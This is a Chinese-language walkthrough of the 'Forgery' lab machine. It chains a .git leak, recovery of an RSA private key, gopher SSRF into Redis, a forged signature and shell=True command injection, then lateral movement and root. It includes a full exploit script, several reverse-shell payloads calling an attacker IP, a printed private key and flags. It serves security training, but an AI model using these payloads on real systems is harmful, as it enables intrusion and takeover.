```table-of-contents
```

# 信息收集

基本的主机发现、端口与服务探测、默认脚本扫描

**对端口进行详细的服务探测**：
```bash
PORT   STATE  SERVICE  VERSION
22/tcp open   ssh      OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open   http     Apache httpd 2.4.67 ((Debian))
| http-git: 
|   192.168.69.139:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: \xE5\xA4\x87\xE4\xBB\xBD\xE7\xA7\x81\xE9\x92\xA5 
|_http-server-header: Apache/2.4.67 (Debian)
|_http-title: FoxOnFire Browser
```
80端口貌似存在 **.git** 泄露

```bash
githacker --url http://192.168.69.139/.git --output-folder .git
```
将 **.git** 全部拉取下来
查看一下git的提交记录等信息，看是否存在泄露重要资产等

```bash
git log                                   
commit 4dbc6a47c9837d8f1b9d2db634367f6a1c4ee91d (HEAD -> master)
Author: yepian <yepian@local.host>
Date:   Sat Jun 20 12:33:35 2026 -0400

    备份私钥

commit 0cf2e78acc5ece698e917964ccd7ed3fd848fb6b
Author: admin <admin@local.host>
Date:   Sat Jun 20 12:32:40 2026 -0400

    Initial Commit

```
`4dbc6a47c9837d8f1b9d2db634367f6a1c4ee91d`中并没有详细信息泄露，但是写着**备份私钥**
`0cf2e78acc5ece698e917964ccd7ed3fd848fb6b`存在一个**public.pem** (得找**private.pem**？？？) --> 还有其他文件内容都先看一下吧！

**pulic.pem**：
```bash
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvn0zdyNVheAC0uH0ir5f
XD1URdsv98fyY0FmHrO6f39Tr3Czg57IEt0YaAvmHyHfbdZmKjc2uPOzaC2aOjh0
8Mn0YlHBPqHFrIKCYwOzjXAK75LJsI2irB2bI/h7GBdcux2eFHL78UtczMn/2Iy7
488E1lthmAPeMglAW6XRoojLT9bcVS6hIzyZwmg7PQ0ssyRgP6PXMUjfVBMOnvdU
f6YqXddLfWftVZCWxqJqRdWfo4Bn9Sq7BFXqFTKHzz0O3WQI1pIItVZ5UZ3Re1bW
AFu2q0eJKKK4OZHUEfagBy0a/03WyVqyHVvPyXsr8OVwE54wfelQWH3XqHcx/4ly
/uLv3N9K80PpoSJE0PdjtGJ9M6+Zflozu7sixhsH5aHxTLpVGEBafQq2pyM59PXA
eCet5mSfdPOAOG3U2H0N4xM+nTdOIkDxl5pLTq3tH5FCdBSqHNwJxqIfZJm0/PHK
U1g8yNKSSmxzMC3tjSPLQnktaMcYlTNBwfaC5u29FGGQqqkoV9J8vnQFHCwE+aqZ
NoyhqdIxpnJqwX/G8yGMcPZIJjw99uwPc/IrT93hMTJMVaADmkznH8d7QwelVge4
DGWs+veK3pICM62u9kQxbSkoO4VdSjqtJVDd6yYxbDMsBu48QPmNVaATQaOp13WG
e93fa887uvHmRkAIqzu9Mg0CAwEAAQ==
-----END PUBLIC KEY-----
```

**api.php**：
```php
<?php
if (!isset($_GET['url'])) {
    die(base64_encode("缺少参数: url"));
}
$url = escapeshellarg($_GET['url']); // 清洗url参数 防参数/命令注入

// RSA-4096签名 防止请求伪造和中间人攻击
$PrivKey = openssl_pkey_get_private('file:///var/www/private.pem');
openssl_sign($url, $signature, $PrivKey, OPENSSL_ALGO_SHA256);

$requestID = uniqid("", true); // 生成唯一请求ID
$data = json_encode([
    'id' => $requestID,
    'url' => $url,
    'sig' => base64_encode($signature)
]);

// 利用Redis队列优化体验
// 1. 避免并发造成资源高消耗
// 2. 遵循最小权限原则 传递给受限进程执行剩余逻辑
$redis = new Redis();
$redis->connect('127.0.0.1', 6379);
$redis->lPush('URLqueue', $data);

$timeout = 10;
$interval = 0.1;
$waited = 0;
// 每0.1秒检查结果是否传回
while ($waited < $timeout) {
    $result = $redis->get($requestID);
    if ($result) {
        // 删除结果key
        $redis->del($requestID);
        echo $result;
        exit;
    }
    usleep($interval * 1000000); // 微秒
    $waited += $interval;
}
die(base64_encode("请求超时"));
?>

```

**handler/main.py**：
```python
#!/usr/bin/python3
import redis
import json
from base64 import b64encode, b64decode
import subprocess
import time
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
import sys
import CodeManager

# 连接Redis
r = redis.Redis(host='127.0.0.1', port=6379, db=0, decode_responses=True)
# 加载公钥
with open('/opt/handler/public.pem', 'r') as f:
    PubKey = RSA.import_key(f.read())

class Task:
    # 解析json
    def __init__(self, data):
        self.id = data['id']
        self.url = data['url']
        self.sig = b64decode(data['sig'])

    # 验证签名 返回签名是否有效
    def SignatureValidation(self):
        try:
            pkcs1_15.new(PubKey).verify(SHA256.new(self.url.encode('utf-8')), self.sig)
            return True
        except:
            return False

    # 处理URL 返回stdout
    def __getitem__(self, cmd):
        proc = subprocess.run(cmd.format(url=self.url), shell=True, capture_output=True)
        return b64encode(proc.stdout).decode('utf-8')

# 测试类初始化正常
data = {"id":0, "url":"127.0.0.1"}
task = Task(data)

# 源码检查 参数传递安装路径 默认值"/opt/handler/"
if sys.argv[1] == "check":
    try:
        InstallDir = sys.argv[2]
    except:
        InstallDir = "/opt/handler/"
    CodeManager.check(InstallDir)
    sys.exit()

while True:
    try:
        RequestData = r.brpop('URLqueue', timeout=1)
        if RequestData:
            task = Task(json.loads(RequestData[1])) # 解析请求
            if not task.SignatureValidation(): # 检查签名
                message = "签名无效"
                r.setex(ReqID, 10, b64encode(message.encode('utf-8')))
                continue
            result = task["curl -s --max-time 1 --url {url}"]
            r.setex(task.id, 10, result) # 传回结果
        else:
            continue
    except:
        time.sleep(5)

```

从**api.php**可以得出：应该是有一个**private.pem**的，但是被处理了（没法通过 file:///var/www/private.pem 读取） --> 尝试**SSRF**；清洗用户传入的**url** + **私钥（JSON）** 后推入Redis

通过一系列的处理，**验证签名是否有效**再从**Redis**队列中读取参数执行**curl**命令（暂时分析到这里吧！若其他的途径走投无路可会过来看看！）

先看看**SSRF**能读取到那些内容吧！

# SSRF利用

```bash
curl -s 'http://Forgery/api.php?url=file:///etc/passwd' | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
yepian::1000:1000::/home/yepian:/bin/rbash
redis:x:101:104::/var/lib/redis:/usr/sbin/nologin
```
读取 **/etc/passwd** 发现**yepian**这个用户是空密码！！！
那先尝试**SSH**登录一下

```bash
ssh yepian@Forgery                          

= 你已被服务器封禁 =
封禁时长: 3650天
执行人: root
理由: 泄漏项目机密 鉴于主动清除含敏感信息的commit 从封禁一辈子改为3650天
如有异议 请联系管理员

违规证据已固定 ~/.bash_history
git add private.pem
git commit -m "备份私钥"
git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch private.pem' --tree-filter 'rm -f private.pem' -- --all
git reflog expire --expire=now --all
rm -rf .git/refs/original
rm -rf .git/logs

即将退出登录
Connection to forgery closed.

```
被踢出来了！！！
但是得知：**.git中有未清除⼲净的commit 包含私钥**

那么就可以尝试查看一下：
```bash
git fsck --unreachable
Checking ref database: 100% (1/1), done.
Checking object directories: 100% (256/256), done.
unreachable blob a6602366d7da9f05791091eb1829273b0ff62ec1
unreachable commit 2beafd018224a6060fe9a5b9180ab7dba67c0cf5
unreachable tree 9f008b5963c399ac6d1562c6435f9172d7188f42
```
确实存在

```bash
git show a6602366d7da9f05791091eb1829273b0ff62ec1 >> private.pem

cat private.pem                                                    
-----BEGIN PRIVATE KEY-----
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
gvNbE/fmTd5EfIIVERXsQTl96uVpqw==
-----END PRIVATE KEY-----
```
拿到密钥了

但是通过**SSRF**得知，貌似是没法直接登录的（即使是使用**private.pem**也不行，可以尝试一下）

**问题**：现在的问题就是即使通过私钥也没法登录，得像一个办法拿到Shell。既然**SSH**不行那就看看**Web**是否有办法 ---> 也就是说得审计一下代码了！！！


# 代码审计

查询一下**escapeshellarg**函数的作用：
- 将输入用**单引号**包裹，并对字符串内部的单引号进行转义（`'` → `'\''`）。
- 效果：无论用户输入多古怪的 shell 元字符（`;`, `|`, `$()`, `` ` ``, `\n` 等），最终交给 shell 的都**只是一个普通的字符串参数**，无法跳出引号执行额外命令。

输入：`http://foo.com; id`  
转义后：`'http://foo.com; id'`

---> 这个方法隔绝的就是多参数执行命令的情况，**带外层单引号的整个字符串**
但是这里有个问题，**escapeshellarg**只限制了**命令注入**，但是**协议层**的攻击并没有阻止（**从file:///etc/passwd 攻击** 就可以看出没有有效的阻止协议层的攻击！！！）

**思考**：得想办法使用协议层的攻击绕过清洗并推入Redis中
（脚本写起来有点难度，那就交给AI吧！！！）

```Python                              
#!/usr/bin/env python3

import sys, json, urllib.parse, uuid
import requests
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from base64 import b64encode

PRIVKEY = "private.pem"

def sign(url, key):
    h = SHA256.new(url.encode())
    sig = pkcs1_15.new(key).sign(h)
    return b64encode(sig).decode()

def redis_cmd_lpush(queue, data):
    cmd = f"*3\r\n$5\r\nLPUSH\r\n${len(queue)}\r\n{queue}\r\n${len(data)}\r\n{data}\r\n"
    return cmd

def gopher_url(host, port, payload):
    encoded = urllib.parse.quote(payload, safe='')
    return f"gopher://{host}:{port}/_{encoded}"

def build_revshell_payload(typ, ip, port):
    if typ == "bash":
        return f"http://x; bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif typ == "python":
        return f"""http://x; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
    elif typ == "python2":
        return f"""http://x; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
    elif typ == "test":
        return f"http://x; curl http://{ip}:{port}/whoami"
    else:
        return f"http://x; {typ}"   # 直接执行自定义命令

def main():
    if len(sys.argv) < 4:
        print("用法: {} <target_url> <kali_ip> <kali_port> [payload_type|command]".format(sys.argv[0]))
        print("  payload_type: bash / python / python2 / test")
        sys.exit(1)
    target = sys.argv[1]
    lip = sys.argv[2]
    lport = sys.argv[3]
    ptype = sys.argv[4] if len(sys.argv) >= 5 else "python"

    key = RSA.import_key(open(PRIVKEY).read())
    evil_url = build_revshell_payload(ptype, lip, lport)
    sig = sign(evil_url, key)

    task_id = str(uuid.uuid4())
    task_json = json.dumps({"id": task_id, "url": evil_url, "sig": sig})

    # 注入 Redis
    gopher_payload = redis_cmd_lpush("URLqueue", task_json)
    gopher = gopher_url("127.0.0.1", 6379, gopher_payload)

    print(f"[*] 注入恶意任务 (type={ptype})")
    try:
        r = requests.get(target, params={"url": gopher}, timeout=5)
        print(f"[*] 响应: {r.text[:100]}")
    except Exception as e:
        print(f"[!] 请求异常: {e}")

    print(f"[+] 监听端口: {lport}，等待连接...")

if __name__ == "__main__":
    main()
```
执行一下命令
```bash
python3 exploit.py http://Forgery/api.php 192.168.69.128 4444 'printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY5LjEyOC80NDQ0IDA+JjE=|base64 -d|bash'
```

![](assets/Forgery/file-20260625100305936.png)
成功反弹！！

# 枚举提权&横向移动

进入后发现时**nobady**用户（低权限） --> 得想办法横向移动到**yepian**用户
现在进行基本的信息枚举

![](assets/Forgery/file-20260625101646507.png)
在枚举目录/文件信息时发现**BanRestrict**是**可读写执行**的文件

![](assets/Forgery/file-20260625101852984.png)
这不就是尝试通过SSH连接时的输出内容嘛！！！
既然如此看一看SSH是否存在攻击点（利用该可读写执行文件进行操作）

查看一下SSH的配置文件：`/etc/ssh/sshd_config`
```bash
nobody@Forgery:/opt/handler$ cat /etc/ssh/sshd_config
cat /etc/ssh/sshd_config

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/bin:/usr/bin:/bin:/usr/games

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin yes
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
AuthorizedKeysFile      .ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to "no" here!
PasswordAuthentication yes
PermitEmptyPasswords yes

# Change to "yes" to enable keyboard-interactive authentication.  Depending on
# the system's configuration, this may involve passwords, challenge-response,
# one-time passwords or some combination of these and other methods.
# Beware issues with some PAM modules and threads.
KbdInteractiveAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of "PermitRootLogin prohibit-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale and color environment variables
AcceptEnv LANG LC_* COLORTERM NO_COLOR

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

Match Group banned
    X11Forwarding no
    AllowTcpForwarding no
    ForceCommand bash /opt/BanRestrict

```
从最后的内容可以得出：
- `Group banned`：所有属于 `banned` 组的用户，SSH 登录时都会进入这个特殊规则。
- **禁止 X11 转发**：不能通过 SSH 打开图形窗口。
- **禁止 TCP 转发**：不能做端口转发、动态转发，断了用这台机器当跳板的路。
- **`ForceCommand`**：**无论用户原本想执行什么命令，都会被忽略**，SSH 服务端会强制执行 `bash /opt/BanRestrict`。

---> 这其实就是为什么没法通过SSH登录的缘由了！
（不用看也可以得出：**yepian**也在**banned**组中）

```bash
nobody@Forgery:/opt/handler$ cat /etc/group | grep yepian
cat /etc/group | grep yepian
yepian:x:1000:
banned:x:1001:yepian
dev:x:1002:root,yepian
```

那么攻击思路就很简单了：
重构`/opt/BanRestrict`后，直接登录即可（因为上面得知**yepian**是空密码）

那就直接改掉它就行（实战中最好备份一下，用于还原）
```bash
echo 'exec /bin/bash -i' > /opt/BanRestrict
```

![](assets/Forgery/file-20260625103245083.png)
横向移动成功！！！

**User_Flag**：**flag{user-24900750c5c03ffe834248ba2e145cfa}**


接下来就是**枚举提权**:
```bash
yepian@Forgery:~$ sudo -l
Matching Defaults entries for yepian on Forgery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User yepian may run the following commands on Forgery:
    (root) NOPASSWD: /usr/bin/python3 /opt/handler/main.py check *

```
`/opt/handler/main.py`是无需密码的**Root**权限执行的自动任务

![](assets/Forgery/file-20260625104902537.png)
在查看基本权限时发现，**main.py**属于**dev**
而之前枚举时貌似**yepian**也属于**dev**组
再确定一下：
![](assets/Forgery/file-20260625105052612.png)

---> 那就意味着其实可以直接修改**main.py**
那就直接把**root**权限反弹出来即可
```bash
cat > /opt/handler/main.py << 'EOF'
#!/usr/bin/python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.69.128",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
```
（使用的是**socket建立TCP连接的方法进行反弹Shell的**，还有很多方法：问AI，浏览器搜索都行）
比如：`os.system("bash -c 'bash -i >& /dev/tcp/192.168.69.128/4444 0>&1'")`

![](assets/Forgery/file-20260625105658675.png)
成功提权！！！

**Root_Flag**：**flag{root-3b124dc0b2553d41c27d853b197c1043}**

# 小结

该靶机的难点主要集中在**WebShell阶段**：**利用 Gopher 协议的 SSRF + 对私钥的掌握，伪造签名后将恶意命令注入 Redis 队列，再由 Python 消费者的 `shell=True` 命令注入完成反弹 Shell**

**基本攻击链**：
```
Git泄露的利用（恢复不可达对象）
	|
对代码的审计（PHP的escapeshellarg函数的缺陷）
以及Redis的利用逻辑
	|
结合SSRF的Gopher协议特征+签名伪造实现恶意代码注入Redis队列
	|
赋予反弹Shell的恶意代码获得立足点（一）
	|
对文件权限枚举以及用户分组的理解（完成横向移动）
	|
自动任务的构建与利用（Root权限执行）
```

**思考点**：
- 在横向移动时要想到去看一下**sshd_config**（因为之前测试直接SSH登录时出现了错误，就要考虑是否可以将它作为入口点进行分析）

**重点**：理解伪造RSA证书的逻辑（虽然在AI时代这些脚本的书写十分简单，但其原理的理解也是必要的）

**真正的渗透过程，极少是“一键日站”式的丝滑体验，而是在大量错误和异常中拼凑出攻击路径。**
**不正常的报错往往就是通往成功的阶梯**